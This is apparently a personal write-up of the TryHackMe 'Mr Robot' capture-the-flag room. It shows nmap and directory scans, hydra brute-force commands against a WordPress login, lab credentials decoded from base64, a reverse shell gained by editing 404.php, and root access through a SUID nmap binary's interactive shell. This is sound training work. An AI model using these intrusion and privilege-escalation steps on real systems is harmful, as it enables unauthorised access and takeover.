
#nmap
                                                                                                                                                                                                                  >
┌──(kali㉿kali)-[~/TryHackMe/mr_robot]
└─$ nmap -p- -sC -A 10.201.17.140 --min-rate=1000 -o nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:59 EDT
Nmap scan report for 10.201.17.140
Host is up (0.35s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 76:d7:e1:7d:50:5d:94:bb:a1:ab:f4:87:8c:0d:8c:9a (RSA)
|   256 ae:3d:da:cc:b2:66:ec:de:a5:5f:4c:c2:d8:18:c9:65 (ECDSA)
|_  256 50:ae:8c:4a:78:0a:6d:d5:ec:e0:6b:47:9d:44:5c:95 (ED25519)

80/tcp  closed http

443/tcp closed https
Device type: general purpose|storage-misc
Running (JUST GUESSING): Linux 2.6.X|3.X|5.X|4.X (90%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:4.15 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 2.6.32 - 3.13 (90%), Linux 5.0 - 5.14 (90%), Linux 4.15 (89%), Linux 3.10 - 4.11 (88%), Linux 3.2 - 4.14 (86%), Linux 4.15 - 5.19 (86%), Linux 2.6.32 - 3.10 (86%), HP P2000 G3 NAS d>
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   302.96 ms 10.8.0.1
2   ... 3
4   373.76 ms 10.201.17.140
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.83 seconds
__________________________________________________________________________________________________________________________________________________________________________________________________________________________
#dir
[00:07:16] 200 -    1KB - /wp-login.php
[00:07:16] 301 -    0B  - /wp-register.php  ->  https://10.201.17.140/wp-login.php?action=register
[00:07:16] 302 -    0B  - /wp-signup.php  ->  https://10.201.17.140/wp-login.php?action=register
[00:07:18] 301 -    0B  - /www/phpMyAdmin/index.php  ->  https://10.201.17.140/www/phpMyAdmin/
[00:07:19] 301 -    0B  - /xampp/phpmyadmin/index.php  ->  https://10.201.17.140/xampp/phpmyadmin/
[00:05:40] 200 -   64B  - /readme
[00:05:40] 200 -   64B  - /readme.html
[00:05:45] 200 -   41B  - /robots.txt  // found a dictionary here
200   158B   https://10.201.17.140/license
__________________________________________________________________________________________________________________________________________________________________________________________________________________________
//after this i ran 
hydra -L users.txt -P passwords.txt <target_ip> http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Location"
//to bruteforce using the dictionary i found from the robots.txt
__________________________________________________________________________________________________________________________________________________________________________________________________________________________
//This user name was found through burpsuite when I bruteforced the username field with the dictionary

    username = Elliot (found manually)
running :  hydra -l Elliot  -P fsocity.txt -f  -t 64  10.201.17.140 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Location"

//I left hydra to bruteforce but when i  returned it was still going so I reduced the dictionary
__________________________________________________________________________________________________________________________________________________________________________________________________________________________
**determinig word count :                                                                                                                                                                                         >
┌──(kali㉿kali)-[~/TryHackMe/mr_robot]
└─$ file fsocity.dic
fsocity.dic: empty

//converted it into .txt
┌──(kali㉿kali)-[~/TryHackMe/mr_robot]
└─$ wc fsocity.txt
 858160  858160 7245381 fsocity.txt

//without filtering it takes too long
//I was using wpscan as well but ....
__________________________________________________________________________________________________________________________________________________________________________________________________________________________
/filtering part/
──(kali㉿kali)-[~/TryHackMe/mr_robot]
└─$ cat /home/kali/TryHackMe/mr_robot/fsocity.txt | grep -E '^.{8,}' > filtered_wordlist.txt
                                                                                                                                                                                                                  >
┌──(kali㉿kali)-[~/TryHackMe/mr_robot]
└─$ ls
filtered_wordlist.txt  fsocity.dic  fsocity.txt  hydra.restore  nmap.txt  notes.txt  reports
                                                                                                                                                                                                                  >
┌──(kali㉿kali)-[~/TryHackMe/mr_robot]
└─$ wc filtered_wordlist.txt
 324158  324158 4101743 filtered_wordlist.txt
__________________________________________________________________________________________________________________________________________________________________________________________________________________________
# While all this went by and my machine crashed two time I found out that we don't need to bruteforce at all...
remeber  this --> /license <- directory?
If you check the developer tools in this endpoint you can get the creds in base64 format..
decode it and we get:
elliot:ER28-0652
__________________________________________________________________________________________________________________________________________________________________________________________________________________________
//After authentication we found out that we can update the codes written in the website , we can try to update endpoints and execute the code.
  I changed the code of 404.php to get a shell

//upon firing the 404.php the code get's executed and we get a shell"

─$ pwncat -l 5555
Linux ip-10-201-61-22 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 09:54:41 up 19 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
$

__________________________________________________________________________________________________________________________________________________________________________________________________________________________
#priv_sec

//If you can't make sense of this then we just abused /usr/local/bin/nmap for this 

$ find / -perm -4000 -type f 2>/dev/null | less
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

$  /usr/local/bin/nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
__________________________________________________________________________________________________________________________________________________________________________________________________________________________

//The flags  can be found in the robot and root directory , enjoy!

__________________________________________________________________________________________________________________________________________________________________________________________________________________________
